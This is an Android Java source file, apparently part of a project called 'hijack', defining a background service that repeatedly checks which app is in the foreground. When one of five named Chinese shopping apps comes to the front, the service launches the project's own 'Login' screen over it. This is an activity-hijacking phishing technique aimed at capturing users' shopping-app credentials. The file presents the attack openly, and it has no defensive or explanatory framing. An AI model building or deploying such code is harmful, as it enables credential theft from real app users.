package com.haoren.hijack;

import java.util.Arrays;
import java.util.List;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
//referrence https://github.com/jaredrummler/AndroidProcesses
public class GetRunningTasksService extends Service{
	private String[] TARGET_APPS = new String[]{"com.achievo.vipshop","com.jingdong.app.mall","com.meilishuo","com.dangdang.buy2","com.mogujie"};
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		hiJack();
		
		return START_NOT_STICKY;
	}
	
	
	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	public void hiJack(){
		Thread thread=new Thread(new Runnable()
        {	
            @Override
            public void run()
            {
            	while(true){
            		ActivityManager am = (ActivityManager) getBaseContext().getSystemService (Context.ACTIVITY_SERVICE);
	                ComponentName cn = am.getRunningTasks(1).get(0).topActivity;
	                String packageName = cn.getPackageName();
	                List<String> list = Arrays.asList(TARGET_APPS);
	                if(packageName != null && list.contains(packageName)){
	                	Intent i = new Intent();
	        			i.setClassName("com.haoren.hijack", "com.haoren.hijack.Login");
	        			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        			getApplicationContext().startActivity(i);
	                	break;
	                	
	                }

            	}
            }
        });
        thread.start();
	}
}